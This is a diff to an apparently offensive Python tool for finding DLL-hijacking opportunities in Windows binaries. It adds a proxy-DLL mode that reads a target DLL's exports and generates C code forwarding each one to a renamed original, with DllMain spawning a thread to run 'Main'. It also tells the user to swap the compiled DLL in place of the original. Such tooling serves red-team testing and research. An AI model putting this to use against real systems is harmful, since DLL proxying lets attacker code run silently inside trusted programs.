@@ -8,9 +8,12 @@ import time
 import argparse
 import subprocess
 import pefile
+import string
+import random
 
 PARSER = argparse.ArgumentParser()
-PARSER.add_argument('-f', '--file', type=str, help='define the targeted binary', required=True)
+PARSER.add_argument('-f', '--file', type=str, help='define the targeted binary (use it alone without -p or -n)', required=False)
+PARSER.add_argument('-p', '--proxydll', type=str, help='create a proxy dll (redirecting all the functions to the original DLL)', required=False)
 ARGS = PARSER.parse_args()
 
 # The DLL filenames who starts with one element of this list will not be checked.
@@ -29,7 +32,11 @@ dlls_excludes = {
 	'ole32',
 	'ninput',
 	'setupapi',
-	'mscoree'
+	'mscoree',
+	'msvcp_win',
+	'oleaut32',
+	'advapi32',
+	'crypt32'
 }
 
 def ascii():
@@ -37,7 +44,7 @@ def ascii():
 	print('██▪ ██ ██•  ██•  ██ ▀▄ █·▐█ ▀█ •█▌▐█•██  ')
 	print('▐█· ▐█▌██▪  ██▪  ▐█·▐▀▀▄ ▄█▀▀█ ▐█▐▐▌ ▐█.▪')
 	print('██. ██ ▐█▌▐▌▐█▌▐▌▐█▌▐█•█▌▐█ ▪▐▌██▐█▌ ▐█▌·')
-	print('▀▀▀▀▀• .▀▀▀ .▀▀▀ ▀▀▀.▀  ▀ ▀  ▀ ▀▀ █▪ ▀▀▀  v0.2')
+	print('▀▀▀▀▀• .▀▀▀ .▀▀▀ ▀▀▀.▀  ▀ ▀  ▀ ▀▀ █▪ ▀▀▀  v0.3')
 
 def rreplace(s, old, new):
 	return (s[::-1].replace(old[::-1],new[::-1], 1))[::-1]
@@ -112,7 +119,8 @@ def check_if_excluded(dll_name):
 def get_imports_functions(dll_name, imports):
 	functions = []
 	for imp in imports:
-		functions.append(imp.name.decode('utf-8'))
+		if imp.name is not None:
+			functions.append(imp.name.decode('utf-8'))
 	return functions
 
 def generate_test_dll(functions = None):
@@ -122,13 +130,19 @@ def generate_test_dll(functions = None):
 			if functions is not None:
 				for line in fin:
 					if '##DLL_MAIN##' in line:
-						fout.write(line.replace('##DLL_MAIN##', ''))
+						if ARGS.proxydll:
+							fout.write(line.replace('##DLL_MAIN##', 'CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)Main, NULL, NULL, NULL);\nbreak;'))
+						else:
+							fout.write(line.replace('##DLL_MAIN##', ''))
 					elif '##EXPORTED_FUNCTIONS##' in line:
-						for func in functions:
-							if len(func) > 0:
-								exported_functions.append(f'__declspec(dllexport) void {func}()' + '{ Main(); }')
-						exported_functions = '\n'.join(exported_functions)
-						fout.write(line.replace('##EXPORTED_FUNCTIONS##', exported_functions))
+						if ARGS.proxydll:
+							fout.write(line.replace('##EXPORTED_FUNCTIONS##', functions))
+						else:
+							for func in functions:
+								if len(func) > 0:
+									exported_functions.append(f'__declspec(dllexport) void {func}()' + '{ Main(); }')
+							exported_functions = '\n'.join(exported_functions)
+							fout.write(line.replace('##EXPORTED_FUNCTIONS##', exported_functions))
 					else:
 						fout.write(line)
 			else:
@@ -176,7 +190,28 @@ def check_dll_hijacking(binary_name, binary_original_directory, dll_name, export
 		input(f'\n\n[+] [!] Admin privs required on {binary_name} start it manually to test the dll hijack and press enter to continue.')
 		return False
 
+def generate_proxy_dll():
+	exported_functions = []
+
+	letters = string.ascii_letters
+	name_dll = ''.join(random.choice(letters) for i in range(5))
+	original_name = os.path.basename(ARGS.proxydll)
+
+	pe = pefile.PE(ARGS.proxydll)
+
+	for entry in pe.DIRECTORY_ENTRY_EXPORT.symbols:
+		func = entry.name.decode('utf-8')
+		exported_functions.append(f'#pragma comment(linker,"/export:{func}={name_dll}.{func},@{entry.ordinal}")')
+	exported_functions = '\n'.join(exported_functions)
+	
+	generate_test_dll(exported_functions)
+	print(f'\n\n[+] Rename the original dll file {name_dll}.dll and copy the compiled dll to the original directory as {original_name}')
+
 def main():
+	if ARGS.proxydll:
+		generate_proxy_dll()
+		sys.exit()
+
 	# Create output dir if not exists.
 	create_dir('output')
 
